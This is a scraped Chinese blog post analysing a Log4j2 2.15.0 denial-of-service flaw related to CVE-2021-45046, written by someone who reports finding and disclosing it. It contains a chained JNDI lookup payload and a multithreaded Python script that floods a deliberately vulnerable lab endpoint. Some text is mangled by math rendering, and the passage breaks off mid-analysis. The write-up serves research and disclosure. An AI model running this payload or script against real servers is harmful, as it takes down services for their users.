@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>Apache Log4j2拒绝服务漏洞分析 - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Apache Log4j2拒绝服务漏洞分析</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+                <div id="content_views" class="markdown_views prism-atom-one-dark">
+                    
+                        
+                    
+                    <h2>
+<a id="_0"></a>介绍</h2> 
+<p>在Log4j2爆出RCE漏洞后，官方给出了RC1和RC2的修复，在之前的文章中有详细分析</p> 
+<p>在RC2的修复之前，其实就存在DOS的可能，但我在RC2的修复后，发现仍然可以造成拒绝服务漏洞</p> 
+<p>于是在RC2修复补丁发布后几小时内向Apache Logging PMC报告了该问题<br> <img src="https://images2.imgbox.com/d7/d1/4jRs3nFe_o.png" alt="在这里插入图片描述"><br> 得到了官方的认可和致谢<br> <img src="https://images2.imgbox.com/b6/92/pqcyFdAJ_o.png" alt="在这里插入图片描述"><br> 其实当时没有想过申请CVE等步骤，但在今天早上看到了Log4j2发布了CVE-2021-45046漏洞报告，这个CVE正是拒绝服务相关，不过漏洞credit信息并不是我，而是国外某团队<br> <img src="https://images2.imgbox.com/dc/c1/vEt12Z8J_o.png" alt="在这里插入图片描述"></p> 
+<blockquote> 
+ <p><strong><a href="https://docs.qq.com/doc/DVExrc2JqUU1DWWd5">【私信回复“log4j”获取相关教程与资料】原理分析/排查/修复</a></strong></p> 
+</blockquote> 
+<p>具体链接参考：</p> 
+<p>https://logging.apache.org/log4j/2.x/security.html</p> 
+<p>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046</p> 
+<p>大致阅读CVE-2021-45046相关的信息后，发现和我提交的DOS漏洞略有不同，但核心部分是一致的</p> 
+<p>在2.15.0版本利用的前提：该漏洞必须在开启lookup功能的情况下触发</p> 
+<p>一种常见的开启姿势是在log4j2.xml中：</p> 
+<pre><code class="prism language-c"><span class="token operator">&lt;</span>appenders<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>console name<span class="token operator">=</span><span class="token string">"CONSOLE-APPENDER"</span> target<span class="token operator">=</span><span class="token string">"SYSTEM_OUT"</span><span class="token operator">&gt;</span>
+        <span class="token operator">&lt;</span>PatternLayout pattern<span class="token operator">=</span><span class="token string">"%msg{lookups}%n"</span><span class="token operator">/</span><span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>console<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>appenders<span class="token operator">&gt;</span>
+</code></pre> 
+<p>这篇文章就从三个方面来谈一谈这个拒绝服务漏洞</p> 
+<ul>
+<li>我是如何发现这个拒绝服务漏洞的</li>
+<li>这个CVE描述的漏洞与我发现的有什么相同和不同之处</li>
+<li>这种拒绝服务漏洞的实际利用场景</li>
+</ul> 
+<h2>
+<a id="_40"></a>挖掘过程</h2> 
+<p>回顾RC1和RC2的修复：如果存在JndiLookup那么会判断其中的的host是否合法</p> 
+<pre><code class="prism language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedHosts<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    LOGGER<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">"Attempt to access ldap server not in allowed list"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>而allowedHosts中一定包含有localhost和127.0.0.1</p> 
+<pre><code class="prism language-c"><span class="token comment">// 拿到本地IP</span>
+private <span class="token keyword">static</span> final List<span class="token operator">&lt;</span>String<span class="token operator">&gt;</span> permanentAllowedHosts <span class="token operator">=</span> NetUtils<span class="token punctuation">.</span><span class="token function">getLocalIps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token function">addAll</span><span class="token punctuation">(</span>hosts<span class="token punctuation">,</span> allowedHosts<span class="token punctuation">,</span> permanentAllowedHosts<span class="token punctuation">,</span> ALLOWED_HOSTS<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">return</span> new <span class="token function">JndiManager</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>allowedHosts<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> 
+<p>这说明如果LDAP服务端在127.0.0.1可以成功lookup</p> 
+<p>然而黑客不可能凭空在服务端本地开启一个恶意的LDAP Server</p> 
+<p>我想到lookup本质是网络相关的操作，会有阻塞的可能。可以构造出Payload使程序lookup本地，而本地不可能开LDAP Server，于是发生超时等待，也许会有拒绝服务漏洞的可能</p> 
+<p>于是修改了RC2的源码，加入了统计时间代码，分析lookup的超时情况</p> 
+<p>（下文分析为什么阻塞的方法不是looup而是context.getAttributes）</p> 
+<pre><code class="prism language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedHosts<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    LOGGER<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">"Attempt to access ldap server not in allowed list"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">long</span> startTime <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Attributes attributes <span class="token operator">=</span> null<span class="token punctuation">;</span>
+try <span class="token punctuation">{<!-- --></span>
+    <span class="token comment">// 阻塞方法</span>
+    attributes <span class="token operator">=</span> this<span class="token punctuation">.</span>context<span class="token punctuation">.</span><span class="token function">getAttributes</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token function">catch</span> <span class="token punctuation">(</span>Exception ignored<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+<span class="token punctuation">}</span>
+<span class="token keyword">long</span> endTime <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>endTime<span class="token operator">-</span>startTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> 
+<p>测试以上打印时间的代码会发现总是打印2000左右，说明超时时间为2秒</p> 
+<p>深入getAttributes可以看到这样的方法</p> 
+<pre><code class="prism language-c"><span class="token keyword">static</span> ResolveResult <span class="token function">getUsingURLIgnoreRootDN</span><span class="token punctuation">(</span>String var0<span class="token punctuation">,</span> Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">&gt;</span> var1<span class="token punctuation">)</span> throws NamingException <span class="token punctuation">{<!-- --></span>
+    LdapURL var2 <span class="token operator">=</span> new <span class="token function">LdapURL</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// 跟入</span>
+    LdapCtx var3 <span class="token operator">=</span> new <span class="token function">LdapCtx</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> var2<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var2<span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var2<span class="token punctuation">.</span><span class="token function">useSsl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    String var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getDN</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null <span class="token operator">?</span> var2<span class="token punctuation">.</span><span class="token function">getDN</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
+    CompositeName var5 <span class="token operator">=</span> new <span class="token function">CompositeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token string">""</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        var5<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">return</span> new <span class="token function">ResolveResult</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>在new LdapCtx方法中存在connect操作导致阻塞</p> 
+<p>（其实connect方法还有几步才会到达最底层的阻塞，不过没有必要继续分析了）</p> 
+<pre><code class="prism language-c">public <span class="token function">LdapCtx</span><span class="token punctuation">(</span>String var1<span class="token punctuation">,</span> String var2<span class="token punctuation">,</span> <span class="token keyword">int</span> var3<span class="token punctuation">,</span> Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">&gt;</span> var4<span class="token punctuation">,</span> boolean var5<span class="token punctuation">)</span> throws NamingException <span class="token punctuation">{<!-- --></span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    try <span class="token punctuation">{<!-- --></span>
+        this<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>false<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>回到之前的问题：为什么阻塞的不是lookup而是getAttributes方法</p> 
+<p>当前代码在连接超时后会抛出异常，走不到lookup方法<br> <img src="https://images2.imgbox.com/da/91/kUr9XcYl_o.png" alt="在这里插入图片描述"><br> 其实在lookup方法中应该也会造成阻塞，简单往里面跟一下会发现类似的代码</p> 
+<pre><code class="prism language-c"><span class="token comment">// 从Attributes里获取属性</span>
+<span class="token comment">// 那么应该调用了getAttributes之类的阻塞方法</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Attributes<span class="token punctuation">)</span>var4<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>Obj<span class="token punctuation">.</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    var3 <span class="token operator">=</span> Obj<span class="token punctuation">.</span><span class="token function">decodeObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Attributes<span class="token punctuation">)</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token comment">// 类似的代码</span>
+    var3 <span class="token operator">=</span> new <span class="token function">LdapCtx</span><span class="token punctuation">(</span>this<span class="token punctuation">,</span> this<span class="token punctuation">.</span><span class="token function">fullyQualifiedName</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>现在发现了能让程序阻塞的办法，那么怎样构造Payload以达成更长时间的阻塞呢</p> 
+<p>Log4j2在处理<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+       
+        是
+       
+       
+        递
+       
+       
+        归
+       
+       
+        解
+       
+       
+        析
+       
+       
+        ，
+       
+       
+        也
+       
+       
+        就
+       
+       
+        是
+       
+       
+        说
+       
+       
+        会
+       
+       
+        处
+       
+       
+        理
+       
+       
+        一
+       
+       
+        个
+       
+       
+        字
+       
+       
+        符
+       
+       
+        串
+       
+       
+        中
+       
+       
+        的
+       
+       
+        所
+       
+       
+        有
+       
+      
+      
+       {}是递归解析，也就是说会处理一个字符串中的所有
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0em;vertical-align: 0em"></span><span class="mord"></span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">递</span><span class="mord cjk_fallback">归</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">析</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">说</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">处</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">符</span><span class="mord cjk_fallback">串</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">有</span></span></span></span></span>{}并分别处理对应的值，每一次的处理都会造成2秒的等待，所以只需简单的拼接即可</p> 
+<pre><code class="prism language-c">private <span class="token keyword">int</span> <span class="token function">substitute</span><span class="token punctuation">(</span>final LogEvent event<span class="token punctuation">,</span> final StringBuilder buf<span class="token punctuation">,</span> final <span class="token keyword">int</span> offset<span class="token punctuation">,</span> final <span class="token keyword">int</span> length<span class="token punctuation">,</span>
+                       List<span class="token operator">&lt;</span>String<span class="token operator">&gt;</span> priorVariables<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token function">substitute</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> bufName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bufName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    String varValue <span class="token operator">=</span> <span class="token function">resolveVariable</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> varName<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> startPos<span class="token punctuation">,</span> endPos<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">int</span> change <span class="token operator">=</span> <span class="token function">substitute</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> startPos<span class="token punctuation">,</span> varLen<span class="token punctuation">,</span> priorVariables<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>例如我拼接三个会阻塞更长的时间</p> 
+<p>（这里是针对本地80端口，实际上可以用大概率关闭的高位端口）</p> 
+<pre><code class="prism language-c">$<span class="token punctuation">{<!-- --></span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token comment">//127.0.0.1}${jndi:ldap://127.0.0.1}${jndi:ldap://127.0.0.1}</span>
+</code></pre> 
+<p>这时候会有师傅产生疑问：</p> 
+<p>在一个web请求中，这样的payload只能让我当前的请求阻塞住，如何实现真正的拒绝服务攻击，让目标网站无法正常处理别人的请求呢？我将在后文给大家展示</p> 
+<h2>
+<a id="_160"></a>利用场景</h2> 
+<p>造一个SpringBoot项目，在resources下添加配置文件开启lookup功能</p> 
+<pre><code class="prism language-c"><span class="token operator">&lt;</span>configuration status<span class="token operator">=</span><span class="token string">"OFF"</span> monitorInterval<span class="token operator">=</span><span class="token string">"30"</span><span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>appenders<span class="token operator">&gt;</span>
+        <span class="token operator">&lt;</span>console name<span class="token operator">=</span><span class="token string">"CONSOLE-APPENDER"</span> target<span class="token operator">=</span><span class="token string">"SYSTEM_OUT"</span><span class="token operator">&gt;</span>
+            <span class="token operator">&lt;</span>PatternLayout pattern<span class="token operator">=</span><span class="token string">"%msg{lookups}%n"</span><span class="token operator">/</span><span class="token operator">&gt;</span>
+        <span class="token operator">&lt;</span><span class="token operator">/</span>console<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>appenders<span class="token operator">&gt;</span>
+
+    <span class="token operator">&lt;</span>loggers<span class="token operator">&gt;</span>
+        <span class="token operator">&lt;</span>root level<span class="token operator">=</span><span class="token string">"error"</span><span class="token operator">&gt;</span>
+            <span class="token operator">&lt;</span>appender<span class="token operator">-</span>ref ref<span class="token operator">=</span><span class="token string">"CONSOLE-APPENDER"</span><span class="token operator">/</span><span class="token operator">&gt;</span>
+        <span class="token operator">&lt;</span><span class="token operator">/</span>root<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>loggers<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>configuration<span class="token operator">&gt;</span>
+为了制造场景所以要移除了Spri
+</code></pre> 
+<p>为了制造场景所以要移除了SpringBoot自带的日志依赖，而选用Log4j2</p> 
+<p>另外引入starter-web以编写Controller模拟真实的接口供测试</p> 
+<pre><code class="prism language-c"><span class="token operator">&lt;</span>dependency<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>groupId<span class="token operator">&gt;</span>org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>artifactId<span class="token operator">&gt;</span>spring<span class="token operator">-</span>boot<span class="token operator">-</span>starter<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>exclusions<span class="token operator">&gt;</span>
+        <span class="token operator">&lt;</span>exclusion<span class="token operator">&gt;</span>
+            <span class="token operator">&lt;</span>groupId<span class="token operator">&gt;</span>org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
+            <span class="token operator">&lt;</span>artifactId<span class="token operator">&gt;</span>spring<span class="token operator">-</span>boot<span class="token operator">-</span>starter<span class="token operator">-</span>logging<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
+        <span class="token operator">&lt;</span><span class="token operator">/</span>exclusion<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>exclusions<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>dependency<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>groupId<span class="token operator">&gt;</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>artifactId<span class="token operator">&gt;</span>log4j<span class="token operator">-</span>core<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>version<span class="token operator">&gt;</span><span class="token number">2.15</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>dependency<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>groupId<span class="token operator">&gt;</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>artifactId<span class="token operator">&gt;</span>log4j<span class="token operator">-</span>api<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>version<span class="token operator">&gt;</span><span class="token number">2.15</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>dependency<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>groupId<span class="token operator">&gt;</span>org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>artifactId<span class="token operator">&gt;</span>spring<span class="token operator">-</span>boot<span class="token operator">-</span>starter<span class="token operator">-</span>web<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
+</code></pre> 
+<p>模拟一个接口：接受message参数并Base64解码后打印日志</p> 
+<pre><code class="prism language-c">@Controller
+public class TestController <span class="token punctuation">{<!-- --></span>
+    private <span class="token keyword">static</span> final Logger logger <span class="token operator">=</span> LogManager<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>TestController<span class="token punctuation">.</span>class<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    @<span class="token function">RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span>
+    @ResponseBody
+    public String <span class="token function">test</span><span class="token punctuation">(</span>String message<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        try <span class="token punctuation">{<!-- --></span>
+            <span class="token comment">// Base64解码</span>
+            String data <span class="token operator">=</span> new <span class="token function">String</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"message:"</span> <span class="token operator">+</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token function">catch</span> <span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+            <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>使用Python编写EXP打自己的靶机</p> 
+<pre><code class="prism language-c">import base64
+import threading
+
+import requests
+# 每一个Payload将会导致阻塞<span class="token number">20</span>秒
+payload <span class="token operator">=</span> <span class="token string">"${jndi:ldap://127.0.0.1}"</span> <span class="token operator">*</span> <span class="token number">10</span>
+payload <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b64encode</span><span class="token punctuation">(</span><span class="token function">bytes</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/test?message="</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+
+
+def <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>
+    requests<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token operator">:</span>
+    threadList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    # 多线程请求
+    <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token operator">:</span>
+        t <span class="token operator">=</span> threading<span class="token punctuation">.</span><span class="token function">Thread</span><span class="token punctuation">(</span>target<span class="token operator">=</span>work<span class="token punctuation">)</span>
+        threadList<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>
+        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> thread in threadList<span class="token operator">:</span>
+        thread<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>启动SpringBoot项目后，可以用这个Python脚本成功造成拒绝服务漏洞</p> 
+<h2>
+<a id="CVE_261"></a>CVE分析</h2> 
+<p>接下来分析这个CVE，其实我不确定对于这个CVE的解读是否正确</p> 
+<p>在Log4j2.xml中支持一种配置从上下文中取值：例如这个例子可以取到loginId值</p> 
+<pre><code class="prism language-c"><span class="token operator">&lt;</span>Appenders<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>Console name<span class="token operator">=</span><span class="token string">"STDOUT"</span> target<span class="token operator">=</span><span class="token string">"SYSTEM_OUT"</span><span class="token operator">&gt;</span>
+        <span class="token operator">&lt;</span>PatternLayout<span class="token operator">&gt;</span>
+            <span class="token operator">&lt;</span>pattern<span class="token operator">&gt;</span><span class="token operator">%</span>d <span class="token operator">%</span>p <span class="token operator">%</span>c<span class="token punctuation">{<!-- --></span><span class="token number">1.</span><span class="token punctuation">}</span> <span class="token punctuation">[</span><span class="token operator">%</span>t<span class="token punctuation">]</span> $$<span class="token punctuation">{<!-- --></span>ctx<span class="token operator">:</span>loginId<span class="token punctuation">}</span> <span class="token operator">%</span>m<span class="token operator">%</span>n<span class="token operator">&lt;</span><span class="token operator">/</span>pattern<span class="token operator">&gt;</span>
+        <span class="token operator">&lt;</span><span class="token operator">/</span>PatternLayout<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>Console<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>Appenders<span class="token operator">&gt;</span>
+</code></pre> 
+<p>如果程序这样写</p> 
+<pre><code class="prism language-c">public <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> throws Exception<span class="token punctuation">{<!-- --></span>
+    ThreadContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"loginId"</span><span class="token punctuation">,</span><span class="token string">"1}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>将会打印</p> 
